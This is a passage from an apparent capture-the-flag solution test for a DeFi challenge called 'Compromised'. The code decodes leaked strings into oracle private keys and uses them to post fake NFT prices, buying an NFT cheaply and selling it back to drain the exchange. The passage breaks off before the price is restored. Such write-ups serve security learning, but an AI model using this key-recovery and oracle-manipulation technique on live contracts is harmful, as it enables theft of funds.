...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    let priKey1 = ethers.utils.toUtf8String("0x" + priKeyethers1);
    ...
    let priKey2 = ethers.utils.toUtf8String("0x" + priKeyethers2);

    priKey1 = ethers.utils.toUtf8String(ethers.utils.base64.decode(priKey1));
    priKey2 = ethers.utils.toUtf8String(ethers.utils.base64.decode(priKey2));

    // const priKey1 = atob(decode.decode(priKeyBytes));
    // const priKey2 = atob(decode.decode(priKey2Bytes));

    console.log("Okie let's hack");
    const oracle1 = new ethers.Wallet(priKey1, ethers.provider);
    const oracle2 = new ethers.Wallet(priKey2, ethers.provider);

    console.log("oracle1 address", oracle1.address);
    console.log("oracle2 address", oracle2.address);

    console.log("set Price for collection");
    await oracle.connect(oracle1).postPrice("DVNFT", 1n);
    await oracle.connect(oracle2).postPrice("DVNFT", 1n);

    console.log("buy NFT with newPrice");

    const tx = await exchange.connect(player).buyOne({ value: 2n });

    console.log("Set Price to 999ETH");
    const balanceExchange = await ethers.provider.getBalance(exchange.address);
    await oracle.connect(oracle1).postPrice("DVNFT", balanceExchange);
    await oracle.connect(oracle2).postPrice("DVNFT", balanceExchange);

    console.log("sell NFT");
    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    console.log("Set Price to nomarl");
